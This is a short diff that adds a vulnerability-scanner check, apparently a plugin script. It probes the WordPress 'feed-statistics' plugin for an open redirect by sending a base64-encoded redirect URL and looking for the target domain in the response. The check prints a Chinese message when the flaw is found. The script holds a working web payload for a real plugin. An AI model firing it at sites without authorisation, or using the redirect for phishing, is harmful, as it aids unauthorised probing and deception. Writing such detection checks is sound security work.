@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /wp-content/plugins/wordpress-feed-statistics/feed-statistics.php?url=aHR0cHM6Ly93d3cuYmFpZHUuY29t
+#define bug = www.baidu.com
+#define info = /wp-content/plugins/wordpress-feed-statistics/feed-statistics.php?url=aHR0cHM6Ly93d3cuYmFpZHUuY29t |存在wordpress插件跳转漏洞
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
